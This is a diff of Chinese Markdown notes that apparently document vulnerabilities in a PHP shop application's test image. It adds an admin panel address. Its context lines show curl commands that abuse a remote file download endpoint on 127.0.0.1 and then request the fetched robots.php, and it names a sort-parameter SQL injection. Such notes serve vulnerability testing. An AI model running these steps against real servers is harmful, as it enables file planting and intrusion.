@@ -1,4 +1,8 @@
-### Home/test/dlfile 远程文件下载
+## 特殊说明
+
+后台地址为 `http://127.0.0.1/index.php/Admin/Index/index`
+
+## Home/test/dlfile 远程文件下载
 
 测试镜像
 
@@ -19,7 +23,7 @@ curl 'http://127.0.0.1/index.php/Home/test/dlfile' -d 'file_url=http://127.0.0.1
 curl 127.0.0.1/robots.php
 ```
 
-### shop_price sort_asc 参数报错注入
+## shop_price sort_asc 参数报错注入
 
 测试镜像
 
